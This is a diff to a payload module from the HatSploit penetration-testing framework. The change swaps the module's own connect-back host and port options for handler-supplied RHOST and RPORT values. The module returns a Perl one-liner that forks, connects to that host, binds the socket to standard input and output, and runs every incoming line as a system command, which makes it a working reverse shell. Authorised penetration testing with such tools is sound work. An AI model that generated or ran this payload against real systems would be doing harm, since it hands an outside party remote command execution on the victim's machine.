@@ -6,7 +6,6 @@
 #
 
 from hatsploit.lib.payload import Payload
-from hatsploit.utils.tcp import TCPClient
 
 
 class HatSploitPayload(Payload):
@@ -24,26 +23,12 @@ class HatSploitPayload(Payload):
         'Type': "reverse_tcp"
     }
 
-    options = {
-        'CBHOST': {
-            'Description': "Connect-back host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'CBPORT': {
-            'Description': "Connect-back port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
-        connback_data = connback_host + ':' + connback_port
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
+        remote_data = remote_host + ':' + remote_port
 
         payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
-        payload = payload.replace("LOCAL_DATA", connback_data)
+        payload = payload.replace("LOCAL_DATA", remote_data)
 
         return payload
